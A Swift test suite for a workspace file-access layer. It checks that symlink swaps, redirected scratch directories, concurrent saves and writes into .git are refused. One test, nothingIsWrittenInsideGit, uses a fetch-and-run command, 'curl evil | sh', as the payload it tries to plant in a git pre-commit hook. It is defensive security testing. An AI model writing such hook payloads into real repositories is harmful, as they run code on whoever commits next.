import Foundation
import Testing
@testable import BloomCore

@Suite("Workspace file descriptor confinement", .scratchDirectory)
struct WorkspaceFileAccessTests {
    private func fixture() throws -> (Workspace, String) {
        let root = TestScratch.unique("workspace"), outside = TestScratch.unique("outside")
        for path in [root + "/nested", outside] { try FileManager.default.createDirectory(atPath: path, withIntermediateDirectories: true) }
        try Data("inside".utf8).write(to: URL(fileURLWithPath: root + "/nested/value.txt"))
        try Data("outside secret".utf8).write(to: URL(fileURLWithPath: outside + "/value.txt"))
        return (Workspace(repoID: .new(), name: "Fixture", branch: "main", path: root, baseBranch: "main"), outside)
    }

    @Test func replacingACheckedDirectoryWithASymlinkCannotRedirectReadOrWrite() throws {
        let (workspace, outside) = try fixture()
        let file = try WorkspaceFileAccess(workspace: workspace, path: "nested/value.txt")
        try FileManager.default.moveItem(atPath: workspace.path + "/nested", toPath: workspace.path + "/original")
        try FileManager.default.createSymbolicLink(atPath: workspace.path + "/nested", withDestinationPath: outside)
        #expect(try file.read(limit: 1024) == Data("inside".utf8))
        try file.replace(Data("updated".utf8), expectedRevision: RemoteFileOperations.revision(Data("inside".utf8)), limit: 1024)
        #expect(try Data(contentsOf: URL(fileURLWithPath: outside + "/value.txt")) == Data("outside secret".utf8))
        #expect(try Data(contentsOf: URL(fileURLWithPath: workspace.path + "/original/value.txt")) == Data("updated".utf8))
        #expect(throws: RemoteFailure.self) { _ = try RemoteFileOperations.download(workspace: workspace, path: "nested/value.txt") }
    }

    @Test func replacingTheLastComponentWithASymlinkIsRefused() throws {
        let (workspace, outside) = try fixture()
        let file = try WorkspaceFileAccess(workspace: workspace, path: "nested/value.txt")
        try FileManager.default.removeItem(atPath: workspace.path + "/nested/value.txt")
        try FileManager.default.createSymbolicLink(atPath: workspace.path + "/nested/value.txt", withDestinationPath: outside + "/value.txt")
        #expect(throws: RemoteFailure.self) { _ = try file.read(limit: 1024) }
        #expect(throws: RemoteFailure.self) { try file.replace(Data("bad".utf8), expectedRevision: "unused", limit: 1024) }
        #expect(try Data(contentsOf: URL(fileURLWithPath: outside + "/value.txt")) == Data("outside secret".utf8))
    }

    @Test func uploadsAndTheirGitignoreCannotFollowASwappedScratchDirectory() throws {
        let (workspace, outside) = try fixture()
        let upload = try WorkspaceFileAccess(workspace: workspace, path: ".bloom/attachments/fixture/file.txt", creatingParents: true)
        try FileManager.default.moveItem(atPath: workspace.path + "/.bloom", toPath: workspace.path + "/original-scratch")
        try FileManager.default.createSymbolicLink(atPath: workspace.path + "/.bloom", withDestinationPath: outside)
        try upload.create(Data("upload".utf8))
        #expect(try Data(contentsOf: URL(fileURLWithPath: workspace.path + "/original-scratch/attachments/fixture/file.txt")) == Data("upload".utf8))
        #expect(!FileManager.default.fileExists(atPath: outside + "/attachments"))
        #expect(throws: RemoteFailure.self) { _ = try RemoteFileOperations.upload(workspace: workspace, name: "new.txt", data: Data()) }
        #expect(!FileManager.default.fileExists(atPath: outside + "/attachments/.gitignore"))
    }

    @Test func anExistingSymlinkCannotBeAcceptedAsTheScratchShield() throws {
        let (workspace, outside) = try fixture()
        try FileManager.default.createDirectory(atPath: workspace.path + "/.bloom/attachments", withIntermediateDirectories: true)
        try FileManager.default.createSymbolicLink(atPath: workspace.path + "/.bloom/attachments/.gitignore", withDestinationPath: outside + "/value.txt")
        #expect(throws: RemoteFailure.self) { _ = try RemoteFileOperations.upload(workspace: workspace, name: "new.txt", data: Data()) }
        #expect(try Data(contentsOf: URL(fileURLWithPath: outside + "/value.txt")) == Data("outside secret".utf8))
    }

    @Test func concurrentSavesCannotBothReplaceTheSameRevision() async throws {
        let (workspace, _) = try fixture()
        let revision = try RemoteReview.file(workspace: workspace, path: "nested/value.txt").revision
        let gate = RemoteFileSaveGate()
        let successes = await withTaskGroup(of: Bool.self, returning: Int.self) { group in
            for text in ["first save", "second save"] {
                group.addTask {
                    await gate.arrive()
                    do {
                        _ = try RemoteFileOperations.write(workspace: workspace, path: "nested/value.txt", text: text, revision: revision)
                        return true
                    } catch { return false }
                }
            }
            var successes = 0
            for await saved in group where saved { successes += 1 }
            return successes
        }
        #expect(successes == 1)
        let final = try RemoteReview.file(workspace: workspace, path: "nested/value.txt").text
        #expect(["first save", "second save"].contains(final))
    }

    /// A settings file a project does not have yet is added with an empty revision, which means
    /// "only if there is none", and one that exists is never overwritten that way.
    @Test func anEmptyRevisionCreatesAFileOnlyWhenThereIsNone() throws {
        let (workspace, _) = try fixture()
        let created = try RemoteFileOperations.write(workspace: workspace, path: ".bloom/settings.toml",
                                                     text: "[[quick_prompts]]\n", revision: "")
        #expect(created.revision == RemoteFileOperations.revision(Data("[[quick_prompts]]\n".utf8)))
        #expect(try String(contentsOfFile: workspace.path + "/.bloom/settings.toml", encoding: .utf8) == "[[quick_prompts]]\n")

        #expect(throws: RemoteFailure.self) {
            try RemoteFileOperations.write(workspace: workspace, path: ".bloom/settings.toml", text: "overwritten", revision: "")
        }
        #expect(try String(contentsOfFile: workspace.path + "/.bloom/settings.toml", encoding: .utf8) == "[[quick_prompts]]\n")

        let edited = try RemoteFileOperations.write(workspace: workspace, path: ".bloom/settings.toml",
                                                    text: "[[quick_prompts]]\nname = \"x\"\n", revision: created.revision)
        #expect(edited.revision != created.revision, "the revision it answered is the one to save with next")
    }

    /// L6 in the review of 19 September 2026: a hook written into `.git` runs as whoever commits next.
    @Test func nothingIsWrittenInsideGit() throws {
        let (workspace, _) = try fixture()
        let hooks = workspace.path + "/.git/hooks"
        try FileManager.default.createDirectory(atPath: hooks, withIntermediateDirectories: true)
        try "#!/bin/sh\n".write(toFile: hooks + "/pre-commit", atomically: true, encoding: .utf8)
        let original = try RemoteFileOperations.revision(Data(contentsOf: URL(fileURLWithPath: hooks + "/pre-commit")))
        for path in [".git/hooks/pre-commit", ".GIT/hooks/post-checkout", "vendor/lib/.git/config"] {
            #expect(throws: RemoteFailure.self, "\(path)") {
                try RemoteFileOperations.write(workspace: workspace, path: path, text: "curl evil | sh", revision: "")
            }
        }
        #expect(throws: RemoteFailure.self) {
            try RemoteFileOperations.write(workspace: workspace, path: ".git/hooks/pre-commit", text: "curl evil | sh", revision: original)
        }
        // Through a symlink with an innocent name, too.
        try FileManager.default.createSymbolicLink(atPath: workspace.path + "/innocent", withDestinationPath: ".git/hooks")
        #expect(throws: RemoteFailure.self) {
            try RemoteFileOperations.write(workspace: workspace, path: "innocent/pre-commit", text: "curl evil | sh", revision: original)
        }
        #expect(try String(contentsOfFile: hooks + "/pre-commit", encoding: .utf8) == "#!/bin/sh\n")
        // Reading is still allowed.
        #expect(try RemoteFileOperations.download(workspace: workspace, path: ".git/hooks/pre-commit").data == Data("#!/bin/sh\n".utf8))
    }
}

private actor RemoteFileSaveGate {
    private var first: CheckedContinuation<Void, Never>?
    private var count = 0
    func arrive() async {
        count += 1
        if count == 2 { first?.resume(); first = nil; return }
        await withCheckedContinuation { first = $0 }
    }
}
